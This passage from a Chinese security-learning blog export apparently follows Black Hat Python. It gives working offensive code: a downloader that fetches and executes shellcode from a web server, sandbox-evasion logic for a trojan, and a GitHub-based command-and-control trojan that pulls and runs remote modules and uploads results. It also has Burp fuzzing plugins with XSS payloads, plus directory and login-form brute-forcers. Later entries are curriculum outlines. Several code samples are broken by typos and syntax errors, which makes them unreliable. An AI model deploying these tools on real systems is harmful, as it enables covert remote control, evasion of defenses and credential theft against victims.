通过PyHook钩住了所有按键事件，然后继续消息循环。回调函数通过返回True来允许执行消息队列中的下一个hook事件。 截取屏幕快照我们可以使用pyWin32库，通过调用本地windowsAPI的方式来实现抓屏功能。 1234567891011121314151617181920212223242526272829303132333435import win32guiimport win32uiimport win32conimport win32api# 获得桌面窗口的句柄，它包含了所有可显示区域，即使这些区域分布在多个显示器上。hdesktop = win32gui.GetDesktopWindow()#获得所有显示屏的像素尺寸width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREENT)# 创建设备描述表desktop_dc = win32gui.GetWindowDC(hdesktop)# 创建基于内存的设备描述表imc_dc = win32ui.CreateDCFromHandle(desktop_dc)mem_dc = img_dc.CreateCompatibleDC()# 创建位图对象screenshot = win32ui.CreateBitmap()screenshot.CreateCompatibleBitmap(imc_dc, width, height)# 将基于内存的设备描述表指向我们捕获到的位图对象mem_dc.SelectObject(screenshot)# 复制屏幕到我们的内存设备描述表中mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)# 将位图保存到文件screenshot.SavaBitmapFile(mem_dc, 'c：\\WINDOWS\Temp\\screenshot.bmp')# 释放对象mem_dc.DeleteDC()win32gui.DeleteObject(screenshot.Gethandle()) Python方式的shellcode执行有时候，你可能需要与目标机器中的某一台主机进行交互，或者在目标主机上运行你钟爱的渗透测试框架中某种新的漏洞利用模块。我们需要具备在目标机器上执行shellcode的方法。 执行原生的二进制shellcode。我们只需要在内存中申请缓冲区，然后利用ctypes模块创建指向这片内存的函数指针，最后调用这个函数。 这个例子中，我们将利用urllib32模块从web服务器上下载base64编码shellcode然后执行。 1234567891011121314import urllib2import ctypesimport base64# 从web服务器上下载shellcodeurl = "http://localhost:8000/shellcode.bin"response = urllib2.urlopen(url)# base64解码shellcodeshellcode = base64.b64decode(response.read())# 申请内存空间shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))# 创建shellcode的函数指针shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))# 执行shellcodeshellcode_func() 附录：https://www.offensive-security.com/metasploit-unleashed/generating-payloads/ 沙盒检测防病毒软件越来越多地使用了某种类型的沙盒来检测可疑样本行为。无论沙盒在哪个位置，我们都要尽量避免网络上可能的防御。使用一些标识来尝试确定我们的木马是否运行在沙盒内部。我们将会监视目标机器最近的用户输入，包括键盘输入和鼠标点击。 以下代码来搜寻键盘事件、鼠标点击和双击事件。脚本还尝试判断沙盒的管理者是否在重复发送输入信号，管理者通过这种行为调用原始的沙盒检测方法。我们将对用户与机器最后交互的时间与机器开机时间进行对比，这是判断是否在沙盒内部运行的极好方式。在沙盒环境钟通常没有用户的交互。 对沙盒进行检测，我们可以决定我们的木马是否应该继续运行。 1234567891011121314151617181920212223242526272829303132333435import ctypesimport randomimport timeimport sysuser32 = ctypes.windll.user32kernel32 = ctypes.windll.kernel32# 初始化记录keystrokes = 0mouse_clicks = 0double_clicks = 0class LASTINPUTINFO(ctypes, Structure): _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong) ]def get_last_input(): struct_lastinputinfo = LASTINPUTINFO() struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO) # 获得用户最后输入的相关信息 user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo)) # 获得机器运行的时间 run_time = kernel32.GetTickCount() elapsed = run_time - struct_lastinputinfo.dwTime print "[*] it's been %d millisecodes since the last input event." % elapsed return elapsed # 测试后删除 while True: get_last_input() time.sleep(1) 先定义了LASTINPUTINFO结构体，它用来保存系统检测到的最后输入事件的时间戳（毫秒为单位）。 需要注意的是，你必须在调用函数写入时间戳之前，初始化cbSize变量，将它设置为结构体大小。之后，我们调用 GetLastInputInfo函数，将系统最后输入事件时间填充到struct_lastinputinfo.dwTime。kernel32.GetTickCount()获取开机至现在运行时间。 最后是一个简单的测试，在脚本运行期间是否可以移动鼠标、敲击键盘上的按键，观察代码输出。 我们下一步定义一些与用户输入相关的阈值。不同的目标和攻击方法设置的阈值都不一样。如：需要用户点击的操作（钓鱼邮件），木马在运行前的一两分钟内，目标系统上都有用户输入。假如目标系统运行十分钟，而用户输入也十分钟之前，那可能就是在沙盒里面。 我们使用ctypes记录按键 123456789101112131415161718def get_key_press(): global mouse_clicks global keystrokes # 对所有可用的键的范围进行迭代 for i in range(0, 0xff): # 使用GetAsyncKeyState函数对每个键进行检查，以确定它是否被按下 if user32.GetAsyncKeyState(i) == -32767: if i == 0x1: mouse_clicks += 1 return time.time() elif i &gt; 32 and i &lt; 127: keystrokes += 1 else: pass return None 上述函数获得目标系统上鼠标点击数量、鼠标点击的时间，以及按键盘的次数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091import ctypesimport randomimport timeimport sysuser32 = ctypes.windll.user32kernel32 = ctypes.windll.kernel32keystrokes = 0mouse_clicks = 0double_clicks = 0class LASTINPUTINFO(ctypes, Structure): _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong) ]def get_last_input(): struct_lastinputinfo = LASTINPUTINFO() struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO) user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo)) run_time = kernel32.GetTickCount() elapsed = run_time - struct_lastinputinfo.dwTime print "[*] it's been %d millisecodes since the last input event." % elapsed return elapseddef get_key_press(): global mouse_clicks global keystrokes for i in range(0, 0xff): if user32.GetAsyncKeyState(i) == -32767: if i == 0x1: mouse_clicks += 1 return time.time() elif i &gt; 32 and i &lt;127: keystrokes += 1 else: pass return Nonedef detect_sandbox(): global mouse_clicks global keystrokes max_keystrokes = random.randint(10, 25) max_mouse_clicks = random.randint(5, 25) double_clicks = 0 max_double_clicks = 10 double_click_threshold = 0.250 first_double_click = None average_mousetime = 0 max_input_threshold = 30000 previous_timestamp = None detection_complete = False last_input = get_last_input() if last_input &gt;= max_input_threshold: sys.exit(0) while not detection_complete: keypress_time = get_key_press() if keypress_time is not None and previous_timestamp is not None: elapsed = keypress_time - previous_timestamp if elapsed &lt;= double_click_threshold: double_clicks += 1 if first_double_click is None: first_double_click = time.time() else: if double_clicks == max_double_clicks: if keypress_time - first_double_click &lt;= (max_double_clicks * double_click_threshold): sys.exit(0) if keystrokes &gt;= max_keystrokes and double_clicks &gt;= max_double_clicks and mouse_clicks &gt; max_mouse_clicks: return previous_timestamp = keypress_time elif keypress_time is not None: previous_timestamp = keypress_time detect_sandbox() print "We are ok!"]]></content>
  </entry>
  <entry>
    <title><![CDATA[基于github的命令和控制]]></title>
    <url>%2F2019%2F09%2F05%2F%E5%9F%BA%E4%BA%8Egithub%E7%9A%84%E5%91%BD%E4%BB%A4%E5%92%8C%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[事前准备 新建如上图片中文件夹，并同步到github。 config目录保存包含对应的每个木马被控端的配置文件。在安装木马的时候，可能需要不同的木马对控端执行不同的任务，这是可以通过修改对应的配置文件来实现。modules目录包含木马被控端所要下载和执行的所有模块代码。我们将修改python导入模块的机制，使得我们的木马可以直接从github的repo中导入python库，就不用下次再编译了。 data目录用来保存木马上传的数据。 创建模块我们在modules里面进行开发，创建一些模块。先新建一个 dirlister.py： 123456789# Run方法 import osdef run(**args): print "[*] In dirlister module" files = os.listdir(".") return str(files) 所有的模块都应该有一个统一的run函数，这样做的好处：一是可以是使用相同的方法加载模块，使用接口更加通用；二是提供了充分的可扩展能力。 environment.py 12345import osdef run(**args): print "[*] In evnironment module" return str(os.environ) 木马配置我们需要对木马分配任务，在一定的时期内完成相应的工作。这意味着我们需要通过一种途径通知木马被控端需要完成什么样的工作及完成这些工作所需要的模块。使用配置文件能满足我们的需求，而且还能根据所需在需要的时候通过定制配置文件提供不同的参数，从而完成不同的任务。而且还能根据需要进行休眠（不分配任何任务）。你可以对安装的每个木马都分配一个唯一的标识符，这样你就可以对安装的每一个木马都分配一个唯一的标识符，这样可以对木马执行返回的数据进行分类，以及控制单个木马执行特定的任务。 我们配置config目录下的TROJANIN.json文件，并返回一个简单的JSON格式文档，我们可以对它进行解释并换成一个Python形式的字典，然后再使用它。同时，JSON格式的配置文件也非常便与我们对其中的选项进行修改。 config/abc.json 12345678[ &#123; "module":"dirlister" &#125; &#123; "module":"environment" &#125;] 编写基于Github通信的木马github的木马，它从GitHub上下载配置选项和运行的模块代码。第一步需要做的是编写调用Github API所需要的代码，来实现与github的连接、认证和通行的功能。 git_trojan.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import jsonimport base64import sysimport timeimport impimport randomimport threadingimport Queueimport osfrom github3 import logintrojan_id = "abc"trojan_config = "%s.json" % trojan_iddata_path = "data/%s/" % trojan_idtrojan_modules = []configured = Falsetask_queue = Queue.Queue()def connect_to_github(): gh = login(username = "youusername", password = "youpassword") repo = gh.repository("youusername", "trojan") branch = repo.branch("master") return gh, repo, branchdef get_file_contents(filepath): gh, repo, branch = connect_to_github() tree = branch.commit.commit.tree.recurse() for filepath in filename.path: print "[*] Found file %s" % filepath blob = repo.blob(filename._json_data['sha']) return blob.content return None def get_trojan_config(): global configured config_json = get_file_contents(trojan_config) config = json.loads(base64.b64decode(config_json)) configured = True for task in config: if task['module'] not in sys.modules exec("import %s" % task['module']) return config def store_module_result(data): gh, repo, branch = connect_to_github() remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000,100000)) repo.create_file(remote_path, "Commit message", base64.b64encode(data)) return 这四个函数是用来交互的，在真实的场景中，需要对认证函数的代码进行混淆，避免账号口令的泄露。通过访问控制，需要设计每个木马可以有权访问项目中的相应位置，避免木马捕获后，对方可以通过你的账号登录并删除所有数据。get_file_contents 函数从远程repo中抓取文件，然后将文件内容读取到本地的变量中，在读取配置文件和模块的源码时会用到它。 我们接下来需要破解python模块的导入机制，实现从github的repo中远程导入文件。 python模块导入功能的破解python 允许我们再导入模块的实现过程中插入我们自己的功能函数，如果在本地找不到需要模块，就会调用我们编写的用于导入的类，它允许我们远程获取repo中的模块并导入。 我们在上面的代码中添加一些内容： 123456789101112131415161718192021222324class GitImporter(object): def __init__(self): self.current_module_code = "" # 获取模块位置 def find_module(self, fullname, path = None): if configured: print "[*] Attemping to retrieve %s" % fullname # 调用远程文件加载函数 new_library = get_file_contents("modules/%s" % fullname) # 如果找到了 if new_library != None: # base64解密保存 self.current_module_code = base64.b64decode(new_library) return self return None def load_module(self, name): #创建本地空对象 module = imp.new_module(name) # 将代码导入这个对象中 exec self.current_module_code in module.__dict__ # 加入到sys.modules列表中 sys.modules[name] = module return module 当python解析器尝试加载不存在的模块时，GitImporter类就会被调用。进行查找 1234567891011121314151617181920def module_runner(module): task_queue.put(1) result = sys.modules[module].run() task_queue.get() # 将结果推送到repo中 store_module_result(result) return# 木马的主循环# 导入模块sys.meta_path = [GitImporter()]while True: if task_queue.empty(): # 获取木马配置文件 config = get_trojan_config() for task in config: # 开启线程 t = threading.Thread(target = module_runner, args = (task['module'],)) t.start() time.sleep(random.randint(1,10)) time.sleep(random.randint(1,10)) 这只是一个初步的东西，后续可以对这个命令和控制技术的核心框架进行大量的改进和完善。如果你要在大范围内使用这个木马，还需要实现后端的自动管理，自动上传下载数据、更新配置和木马文件。后续还需要考虑如何让木马加载动态库和编译过的静态库来扩展功能。]]></content>
  </entry>
  <entry>
    <title><![CDATA[burp插件]]></title>
    <url>%2F2019%2F09%2F03%2Fburp%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[burp支持python，java，ruby插件的扩展，我们可以用这个做自己喜欢用的工具。 在burp上使用python代码需要使用 Jython（一个用java编写的python解释器）JAR独立文件。 在 extender 任务栏标签中，有python environment 选择Jython包。 Burp模糊测试在渗透过程中会有非常多的参数，在手工进行模糊测试时候需要花费很长的时间，我们可以利用burp的插件进行简单的模糊测试。 这个例子，我们利用intruder进行扩展。 IIntruderPayloadGeneratorFactory 允许我们使用Intrude框架 IIntruderPayloadGenerator 则是payload控制的代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768from burp import IBurpExtenderfrom burp import IIntruderPayloadGeneratorFactoryfrom burp import IIntruderPayloadGeneratorfrom java.util import List, ArrayListimport randomclass BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory): def registerExtenderCallbacks(self, callbacks): self._callbacks = callbacks self._helpers = callbacks.getHelpers() callbacks.registerIntruderPayloadGeneratorFactory(self) return def getGeneratorName(self): return "BHP payload Generator" def createNewInstance(self, attack): return BHPFuzzer(self, attack) class BHPFuzzer(IIntruderPayloadGenerator): def __init__(self, extender, attack): self._extender = extender self._helpers = extender._helpers self._attack = attack self._max_payloads = 10 self.num_iterations = 0 return def hasMorePayloads(self): if self.num_iterations == self._max_payloads: return False else: return True def getNextPayload(self, current_payload): payload = "".join(chr(x) for x in current_payload) payload = self.mutate_payload(payload) self.num_iterations += 1 return payload def reset(self): self.num_iterations = 0 return def mutate_payload(self, original_payload): picker = random.randint(1,3) offset = random.randint(0, len(original_payload)-1) if picker == 1: payload += "'" if picker == 2: payload += "&lt;script&gt;alert('BHP!');&lt;/script&gt;" if picker == 3: chunk_length = random.randint(len(payload[offset:]), len(payload)-1) reppeater = random.randint(1,10) for i in range(reppeater): payload += original_payload[offset:offset+chunk_length] payload += original_payload[offset:] return payload 在Burp中利用Bing服务利用Bing API程序化接口提交查询（注: 现在接口可能不能使用了） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from burp import IBurpExtenderfrom burp import IContextMenuFactoryfrom java.swing import JMenuItemfrom java.util import List, ArrayListfrom java.net import URLimport socketimport urllibimport jsonimport reimport base64bing_api_key = ""class BurpExtender(IBurpExtender, IContextMenuFactory): def registerExtenderCallbacks(self, callbacks): self._callbacks = callbacks self._helpers = callbacks.getHelpers() self.context = None callbacks.setExtensionName("BHP Bing") callbacks.registerContextMenuFactory(self) return def createMenuItems(self, context_menu): self.context = context_menu menu_list = ArrayList() menu_list.add(JMenuItem("Send to Bing", actionPerformed =self.bing_menu)) return menu_list def bing_menu(self, event): http_traffic = self.context.getSelectedMessages() print "%d requests highlighted" % len(http_traffic) for traffic in http_traffic: http_service = traffic.getHttpService() host = http_service.getHost() print "User selected host: %s" % host self.bing_search(host) return def bing_search(self, host): is_ip = re.match("[0-9]+(?:\.[0-9]+)&#123;3&#125;", host) if is_ip: ip_address = host domain = False else: ip_address = socket.gethostbyname domain = True bing_query_string = "'ip: %s'" % ip_address self.bing_query(bing_query_string) if domain: bing_query_string = "'domain:%s'" % host self.bing_query(bing_query_string) def bing_query(self, bing_query_string): print "Perfoming Bing search: %s" % bing_query_string quoted_query = urllib.quote(bing_query_string) http_request = "" http_request += "Host: api.datamarket.azure.com\r\n" http_request += "Connection: close\r\n" http_request += "Authorization: Basic %s\r\n" % base64.b64encode(":%s" &amp; bing_api_key) http_request += "User-Agent: Blackhat Python\r\n\r\n" json_body = json_body.split("\r\n\r\n",1)[1] try: r = json.loads(json_body) if len(r["d"]["results"]): for site in r["d"]["results"]: print "*" * 100 print site['Title'] print site['Url'] print site['Description'] print "*" * 100 j_url = URL(site['Url']) if not self._callbacks.isInScope(j_url): print "Adding to Burp scope" self._callbacks.includeInScope(j_url) except: print "No results from Bing" pass return IContextMenuFactory 这个类允许我们在鼠标右键单击Burp中的请求时提供上下文菜单。 一般情况Bing的API密钥需要用Base64进行编码，同时使用HTTP基础认证方式调用API。之后我们讲HTTP请求提交到微软的服务器上，当响应返回时，我们可以得到全部的响应包括HTTP头部，因此我们需要将HTTP响应头分离，并把剩余部分传递给JSON解析器。 利用网站内容生成密码字典1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from burp import IBurpExtenderfrom burp import IContextMenuFactoryfrom javax.swing import JMenuItemfrom java.util import List, ArrayListfrom java.net import URLimport refrom datetime import datetimefrom HTMLParser import HTMLParserclass TagStripper(HTMLParser): def __init__(self): HTMLParser.__init__(self) self.page_text = [] def handle_data(self, data): self.page_text.append(data) def handle_comment(self, data): self.handle_data(data) def strip(self, html): self.feed(html) return " ".join(self.page_text) class BurpExtender(IBurpExtender, IContextMenuFactory): def registerExtenderCallbacks(self, callbacks): self._callbacks = callbacks self._helpers = callbacks.getHelpers() self.context = None self.host = set() self.wordlist = set(["password"]) callbacks.setExtensionName("BHP Wordlist") callbacks.registerContextMenuFactory(self) return def createMenuItems(self, context_menu): self.context = context_menu menu_list = ArrayList() menu_list.add(JMenuItem("Create Wordlist", actionPerformed = self.wordlist_menu)) return menu_list def wordlist_menu(self, event): http_traffic = self.context.getSelectedMessages() for traffic in http_traffic: http_service = traffic.getHttpService() host = http_service.getHost() self.hosts.add(host) http_response = traffic.getResponse() if http_response: self.get_words(http_response) self.display_wordlist() return def get_words(self, http_response): headers, body = http_response.tostring().split('\r\n\r\n', 1) if headers.lower().find('context-type: text') == -1: return tag_stripper = TagStripper() page_text = tag_stripper.strip(body) words = re.findall("[a-zA-Z]\w&#123;2,&#125;", page_text) for word in words: if len(word) &lt;= 12: self.wordlist.add(word.lower()) return def mangle(self, word): year = datetime.now().year suffixes = ['', '1', '!', year] mangled = [] for password in (word, word.capitalize()): for suffix in suffixes: mangled.append("%s%s" % (password, suffix)) return mangled def display_wordlist(self): print "#!comment: BHP Wordlist for sites %s" % ", ".join(self, hosts) for word in sorted(self.wordlist): for password in self.mangle(word): print password return]]></content>
      <categories>
        <category>安全学习</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>网络编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web攻击]]></title>
    <url>%2F2019%2F08%2F31%2Fweb%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[urllib2Web python 的标准库之一，用于解析url。 示例代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import Queueimport threadingimport osimport urllib2threads = 10target = ""directory = ""filters = [".jpg".".gif".".png".".css"]os.chdir(directory)web_paths = Queue.Queue()for r,d,f in os.walk("."): for files in f: remote_path = "%s/%s" % (r,files) if remote_path.startswith("."): remote_path = remote_path[1:] if os.path.splitext(files)[1] not in filters: web_paths.put(remote_path) def test_remote(): while not web_paths.empty(): path = web_paths.get() url = "%s%s" % (target, path) request = urllib2.Request(url) try: response = urllib2.urlopen(request) content = response.read() print "[%d] =&gt; %s" % (response.code, path) response.close() except urllib2.HTTPError as error: print "Failed %s" % error.code pass for i in range(threads): print "Spawning thread: %d" % i t = threading.Thread(target = test_remote) t.start() 暴力破解目录和文件位置我们可以使用简单的代码完成简单的暴力破解工具。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import urllib2import threadingimport Queueimport urllibthreads = 50target_url = ""wordlist_file = ""resume = Noneuser_agent = "Mozila/5.0 (x11; linux x86_64; rv:19.0) Gecko/20100101 firefox/19.0"def build_wordlist(wordlist_file): with open(wordlist_file, "rb") as f: raw_words = fd.readlines() found_resume = False words = Queue.Queus() for word in raw_words: word = word.rstrip() if resume != None: if found_resume: words.put(word) else: if word == resume: found_resume = True print "Resuming wordlist from: %s" % resume else: words.put(word) return words def dir_bruter(word_queue, extensions = None): while not word_queue.empty(): attempt = word_queue.get() attempt_list = [] if "." not in attempt: attempt_list.append("/%s/" % attempt ) else: attempt_list.append("/%s" % attempt ) if extensions: for extension in extensions: attempt_list.append("%s%s" % (attempt, extension) ) for brute in attempt_list: url = "%s%s" % (target_url, urllib.quote(brute)) try: headers = &#123;&#125; headers["User-Agent"] = user_agent r = urllib2.Request(url, headersd = headers) response = urllib2.urlopen(r) if len(response.read()): print "[%d] =&gt; %s" % (response.code, url) except urllib2.URLError, e: if hasattr(e, 'code') and e.code != 404: print "!!! %d =&gt; %s" % (e.code, url) pass word_queue = build_wordlist(wordlist_file)extensions = [".php", ".bak", ".orig", ".inc"]for i in range(threads): t = threading.Thread(target = dir_bruter, args = (word_queue, extensions)) t.start() 暴力破解HTML表格认证要求： 检索登录页面，接受所有返回的cookie值 从HTML中获取所有表单元素 在你的字典中设置所需要猜测的用户名和密码 发送 HTTP POST数据包到登录处理脚本， 数据包含所有的HTML表单文件和存储的cookie值 测试是否能够成功登录Web应用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192import urllib2import urllibimport cookielibimport threadingimport sysimport Queuefrom HTMLParse import HTMLParseuser_threads = 10username = ""wordlist_file = ""resume = Nonetarget_url = ""target_post = ""username_field = "username"password_field = "passwd"success_check = "Administration - Control Panel"class Bruter(object): def __init__(self, username, words): self.username = username self.password_q = words self.found = False print "Finished setting up for: %s" % username def run_bruteforce(self): for i in range(user_threads): t = threading.Thread(target = self.web_bruter) t.start() def web_bruter(self): brute = self.pass.get().rstrip() jar = cookielib.FileCookieJar("cookies") opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar)) response = opener.open(target_url) page = response.read() print "Trying: %s:%s （%d left）" % (self.username, brute, self.password_q.qsize()) parser = BruterParser() parser.feed(page) post_tags = parser.tag_results post_tags[username_field] = self.username post_tags[password_field] = brute login_data= urllib.urlencode(post_tags) login_response = opener.open(target_post， login_data) login_result = login_response.read() if success_check in login_result: self.found = True print "[*] Bruterforce successful." print "[*] Username: %s" % username print "[*] Password: %s" % brute print "[*] Waiting for other threads to exit..." class BruterParser(HTMLParse): def __init__(self): HTMLParse.__init__(self) self.tag_results = &#123;&#125; def handle_starttag(self, tag, attrs): if tag == "input": tag_name = None tag_value = None for name,value in attrs: if name == "name": tag_name = value if name == "value" tag_value = value if tag_name is not None: self.tag_results[tag_name] = valuewords = build_wordlist(wordlist_file)bruter_obj = Bruter(username, words)bruter_obj.run_bruteforce() 当使用 HTMLParser 类的时候，有三种主要的方法可以供你使用，分别是：handle_starttag，handle_endtag和handle_data。其中handle_starttag函数可以在遇到一个HTML标签开启时调用，handle_endtag函数正好相反，在每遇到一个HTML标签闭合时使用。handle_data函数用来处理两个标签之间的原始文本。]]></content>
      <categories>
        <category>安全学习</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>网络编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[人才培养体系]]></title>
    <url>%2F2019%2F08%2F25%2F%E4%BA%BA%E6%89%8D%E5%9F%B9%E5%85%BB%E4%BD%93%E7%B3%BB%2F</url>
    <content type="text"><![CDATA[一、密码学应用二、网络关键基础设施安全三、端点与边界防护四、云安全五、物联网安全六、移动与无线安全七、区块链安全八、WEB安全0x00 WEB安全基础HTTP/HTTPS协议Cookie/Session同源策略Web编解码Web加解密Web编程基础操作系统基础数据库基础社会工程学其他类型Web基础0x01 服务器端信息泄露目录遍历文件泄露源码泄露Git信息泄露SVN信息泄露其他类型信息泄露0x02 SQL注入布尔盲注时间盲注报错注入联合查询注入宽字节注入二次注入其他类型注入0x03 文件包含本地文件包含远程文件包含0x04 文件上传截断上传双重后缀上传解析漏洞上传其他类型文件上传0x05 身份认证与访问控制弱口令爆破验证绕过未授权访问其他类型身份认证与访问控制0x06 反序列化JAVA反序列化PHP反序列化Python反序列化其他类型反序列化0x07 框架漏洞Struts 2漏洞利用Spring MVC漏洞利用Django漏洞利用WordPress漏洞利用Joomla漏洞利用DeDeCMS漏洞利用其他类型框架安全0x08 WebShell一句话木马ASP WebShellJSP WebShellPHP WebShell图片WebShellWebShell混淆隐藏WebShell查杀其他WebShell0x09 跨站脚本攻击反射型XSS存储型XSS0x0A 跨站请求伪造0x0B 客户端信息泄露Cookie泄露本地缓存获取浏览历史记录获取Flash本地共享对象获取ActiveX控件泄露其他类型本地存储泄露0x0C 劫持攻击Session劫持HTTP劫持DNS劫持点击劫持拖拽劫持触屏劫持其他类型劫持攻击0x0D 浏览器安全浏览器沙箱浏览器设置安全ActiveXAdobe Flash浏览器扩展安全自定义协议启动WebRTC其他浏览器安全0x0E 数据库安全数据库安全基线Mysql数据库安全Oracle数据库安全SQLServer数据库安全MongoDB数据库安全PostgreDB数据库安全Redis数据库安全SQLite数据库安全其他类型数据库安全0x0F Web安全工具使用浏览器调试工具使用Google Hack使用Nmap使用Whatweb使用BurpSuite使用AWVS使用Appscan使用SQLMap使用DirBuster使用Chopper使用Metasploit使用Nessus使用其他类型Web安全工具使用0x10 其他Web安全问题命令注入逻辑漏洞利用HTML5安全XML注入Cookie注入Xpath注入CRLF注入Web CC攻击其他类型Web安全问题九、漏洞挖掘与利用十、网络渗透0x00 信息收集社会工程学信息收集 网络端口扫描 网站扫描 软件与硬件信息探测 凭证信息收集 间接攻击目标收集 社交网络信息收集 0x01 定向投递给定域名/IP渗透 鱼叉式钓鱼邮件/短消息 水坑攻击 中间人攻击 DNS/Cache投毒 可信源/供应链污染 无线接入投递 非法硬件植入与欺骗 0x02 漏洞利用固件漏洞利用 操作系统漏洞利用 应用软件漏洞利用 弱口令利用 未授权访问漏洞利用 漏洞利用套件（Exploit Kit） 重放攻击 账户仿冒 文件上传漏洞 文件包含漏洞 命令注入 SQL注入 0x03 代码执行进程注入执行 文件劫持执行 反弹shell执行 远程服务调用 远程命令执行 WebShell执行 0x04 权限提升高权限的应用软件利用 固件漏洞利用提权 合法进程注入提权 利用操作系统漏洞提权 操作系统安全机制绕过 利用数据库提权 利用域控提权 利用合法证书提权 利用操作系统后门提权 管理员密码爆破 0x05 横向移动/内网渗透失险主机信息收集 端口转发 域控渗透 移动存储介质传播 网络设备渗透 摄像头/视频系统渗透 安全设备渗透 办公网络渗透 内网邮箱渗透 内部公共资源污染 同步数据污染 0x06 驻留与持久化基于操作系统机制自启动 基于注册表启动与驻留 基于驱动程序启动与驻留 基于系统服务启动与驻留 基于文件感染/替换启动与驻留 基于后门（Backdoor）持久化 基于隐蔽账户持久化 MBR/BIOS/UEF/Hypervisor级驻留 0x07 痕迹清理系统/网络/应用日志混淆 系统/网络/应用日志删除 系统/网络/应用日志修改 数据恢复技术对抗 系统还原机制利用 安全审计设备干扰与停用 十一、恶意代码十二、逆向分析十三、溯源取证十四、安全运维0x00 资产监测网络拓扑构建与监测内网空间网络资产主动探测企业网络流量资产被动监测IT资产台账管理与维护操作系统运行指标监测 CPU监测 内存监测 硬盘监测 I/O监测 进程监测 流量监测 Docker容器运行状态监测业务系统可用性监测0x01 漏洞扫描Web漏洞巡检 主机漏洞巡检 安全设备漏洞巡检 弱口令批量探测 中间件命令执行漏洞批量监测 运维支持组件漏洞批量监测 第三方框架内漏洞批量监测 大数据组件漏洞批量监测 0x02 安全设备运维网络入侵监测规则维护与更新 主机入侵防御规则与更新 防火墙规则维护与更新 Web应用防火墙规则维护与更新 防病毒软件特征库维护与更新 抗DDOS设备配置 流量控制设备配置 流量分析、统计与回溯 数据库日志安全审计 业务应用运行日志安全审计 0x03 告警处理安全设备误报分析 安全设备告警优化 告警资产定位 告警原因分析 攻击行为回放 告警消除处置 0x04 应急响应网站WebShell排查 网页挂马排查 网页篡改排查 系统脱裤排查 系统后门排查 系统异常崩溃排查 远控木马排查 内存马排查 僵死网络排查 Rootkit排查 勒索软件应急 口令爆破排查 高位漏洞批量检查与响应 管理员账号异常登陆 github信息泄露事件 数据泄露事件处置 0x05 安全基线与加固等级保护合规性检查 操作系统安全基线核查与加固 中间件安全基线核查与加固 应用软件信息与漏洞库关联核查 访问控制策略核查与加固 漏洞补丁分发与更新 0x06 配置核查防火墙配置核查 交换机配置核查 路由器配置核查 中间件安全配置核查 业务应用安全配置核查 0x07 账户管理账号统一权限管理 账户口令合规与认证 VPN账户配置与管理 堡垒机账户权限管理]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>人才体系</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞资料收集]]></title>
    <url>%2F2019%2F08%2F25%2F%E6%BC%8F%E6%B4%9E%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[所理解的安全学习体系体系]]></title>
    <url>%2F2019%2F08%2F25%2F%E6%89%80%E7%90%86%E8%A7%A3%E7%9A%84%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BD%93%E7%B3%BB%E4%BD%93%E7%B3%BB%2F</url>
    <content type="text"><![CDATA[web安全 通用型漏洞（sql注入，xss，任意代码执行等） 框架型漏洞（开源框架漏洞，组件漏洞等） 逻辑型漏洞（越权，文件上传等） WEB安全功能（一些必需实现的功能） 安全工具 WAF绕过技巧 通用型漏洞SQL注入 注入原因 利用方式 防护方式 原因利用方式防护方式框架型漏洞框架型漏动一般都一直在出现，利用代码 也不断更新，请移步到 * * * 查看详情。 逻辑型漏洞web安全功能网络安全 区域划分 网络策略 设备安全 服务器安全 服务器通用 安全基线 软件安全 权限划分 高可用 资源监控 文件保护 放病毒 网络边界服务器 防 Doc 内网服务器 DLP 敏感信息加密 日志收集与分析 ELK及其组件 收集 分析 报告 数据安全 密码学 权限及访问控制 数据采集 数据传输 数据处理 数据加密 数据销毁 常见弱口令及初始密码 安全开发 WEB应用程序 Android/IOS 软件 EXE 游戏 安全工具编写 web扫描器 主机漏洞扫描器 漏洞利用代码 常用的python库 AI安全 基础算法 无线安全区块链安全相关安全法律 国内 国外]]></content>
      <categories>
        <category>学习心得</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>知识体系</tag>
      </tags>
  </entry>
  <entry>
